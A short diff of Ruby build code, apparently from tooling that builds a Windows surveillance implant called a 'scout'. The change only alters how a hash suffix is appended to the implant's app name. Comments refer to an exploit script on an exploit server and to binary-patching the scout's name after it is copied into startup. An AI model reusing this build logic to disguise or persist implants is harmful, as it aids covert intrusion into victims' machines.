@@ -437,7 +437,7 @@ class BuildWindows < Build
     # make the name unique (used by the exploit script on exploit server)
     hash = Digest::SHA1.digest(File.read(path('version')) + info_scout[:name])
     hash = hash.split('').keep_if {|x| x.ord > 128}.join[0..5].unpack('H*').first
-    @appname += hash
+    @appname += '_' + hash
 
     # binary patch the name of the scout once copied in the startup
     patch_file(:file => 'scout') do |content|
